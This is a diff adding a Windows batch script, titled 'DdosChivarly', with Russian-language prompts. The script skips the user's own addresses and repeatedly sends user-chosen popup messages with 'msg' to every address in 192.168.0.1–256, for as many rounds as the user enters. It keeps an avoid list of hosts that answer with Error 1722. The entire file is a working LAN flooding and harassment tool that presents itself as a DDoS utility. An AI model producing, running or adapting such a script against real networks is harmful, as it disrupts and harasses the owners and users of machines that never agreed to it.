@@ -1,0 +1,177 @@
+chcp 65001 >nul && cls
+
+@echo off && title DdosChivarly Version 1.0
+setlocal enabledelayedexpansion
+echo DdosChivarly Ver 1.0
+echo.
+ping -n 2 localhost >nul
+
+set "avoid_list_file=avoid_list.txt"
+set /a ipNumber=0
+
+rem Загрузка существующего списка избегания
+if exist "!avoid_list_file!" (
+    echo Загружаем список избегания из файла...
+    for /f "usebackq delims=" %%A in ("!avoid_list_file!") do (
+        set /a ipNumber+=1
+        set "GlobalIP!ipNumber!=%%A"
+        echo Загружен IP: %%A
+    )
+    echo.
+)
+
+echo Определение вашего IP адреса...
+echo.
+
+rem Получаем шлюз по умолчанию
+set gateway=
+for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /C:"Основной шлюз" /C:"Default Gateway"') do (
+    if not defined gateway (
+        set "gateway=%%i"
+        set "gateway=!gateway: =!"
+    )
+)
+
+if not defined gateway (
+    echo Не удалось определить шлюз по умолчанию   
+) else (
+    echo Шлюз по умолчанию: !gateway!
+)
+
+echo.
+ping -n 1 !gateway! >nul 2>&1
+
+:show_ipconfig
+echo Определение через ipconfig:
+set current_ip_count=0
+for /f "tokens=1,2 delims=:" %%i in ('ipconfig ^| findstr /C:"IPv4"') do (
+    set /a current_ip_count+=1
+    set "ip=%%j"
+    set "ip=!ip: =!"
+    
+    rem Проверяем, нет ли уже этого IP в списке избегания
+    set already_exists=0
+    for /l %%k in (1,1,!ipNumber!) do (
+        if "!ip!"=="!GlobalIP%%k!" set already_exists=1
+    )
+    
+    if !already_exists!==0 (
+        set /a ipNumber+=1
+        set "GlobalIP!ipNumber!=!ip!"
+        echo Новый IP добавлен в избегание: !ip!
+    ) else (
+        echo IP уже в списке избегания: !ip!
+    )
+)
+echo.
+
+echo IP-адреса в списке избегания: !ipNumber!
+echo Генерирую список IP-адресов для отправки запросов. 
+ping -n 2 localhost >nul
+echo.
+
+set /a countRequest=0
+set text=?
+
+echo Список сгенерирован. Введите кол-во запросов которое хотите отправить: 
+set /p main="DdosChivarly> "
+set /a countRequest=%main% 2>nul
+
+if %countRequest% leq 0 (
+    echo Введите верное число
+    pause
+    exit
+)
+
+echo Введите текст:
+set /p mainT="DdosChivarly> "
+
+if "%mainT%"=="" (
+    set "text=?"
+) else (
+    set "text=%mainT%"
+)
+
+echo.
+echo Будет отправлено запросов: %countRequest%
+echo С текстом: %text%
+echo Список избегания: !ipNumber! IP-адресов
+echo.
+pause
+
+echo [Запуск отправки запросов...]
+echo.
+ping -n 2 localhost >nul
+set farip=0
+set /a total_sent=0
+set /a new_avoided=0
+
+rem Создаем временный файл для проверки ошибок
+set "temp_file=%temp%\ddos_check.tmp"
+
+for /l %%i in (1,1,%countRequest%) do (
+    echo.
+    echo [Пакет номер: %%i/%countRequest%]
+    
+    set farip=0
+    for /l %%j in (1,1,256) do (
+        set /a farip+=1
+        set requestip=192.168.0.!farip!
+        
+        set skip_ip=0
+        rem Проверяем, не совпадает ли IP с нашими адресами
+        for /l %%k in (1,1,!ipNumber!) do (
+            if "!requestip!"=="!GlobalIP%%k!" (
+                set skip_ip=1
+            )
+        )
+        
+        if !skip_ip!==0 (
+            echo [ОТПРАВКА] Запрос к !requestip! с текстом: %text%
+            
+            rem Отправляем запрос и проверяем на ошибку 1722
+            msg !requestip! "!text!" 2>!temp_file!
+            
+            rem Проверяем наличие ошибки 1722 в выводе
+            findstr /C:"Error 1722" !temp_file! >nul
+            if !errorlevel! equ 0 (
+                echo [ИЗБЕГАНИЕ] !requestip! добавлен в список избегания (Error 1722)
+                set /a ipNumber+=1
+                set /a new_avoided+=1
+                set "GlobalIP!ipNumber!=!requestip!"
+            ) else (
+                echo [УСПЕХ] Запрос к !requestip! выполнен
+            )
+            
+            set /a total_sent+=1
+        ) else (
+            echo [ПРОПУСК] !requestip! - в списке избегания
+        )
+    )
+    echo [Пакет %%i завершен]
+    ping -n 1 localhost >nul
+)
+
+rem Сохраняем обновленный список избегания в файл
+echo Сохраняем список избегания...
+> "!avoid_list_file!" (
+    for /l %%i in (1,1,!ipNumber!) do (
+        echo !GlobalIP%%i!
+    )
+)
+
+rem Удаляем временный файл
+if exist "!temp_file!" del "!temp_file!"
+
+echo.
+echo ========================================
+echo [СТАТИСТИКА]
+echo Всего пакетов отправлено: %countRequest%
+echo Всего IP обработано: %total_sent%
+echo IP адресов в избегании: !ipNumber!
+echo Новых добавлено в избегание: !new_avoided!
+echo Файл списка: !avoid_list_file!
+echo ========================================
+echo.
+echo Операция завершена.
+pause
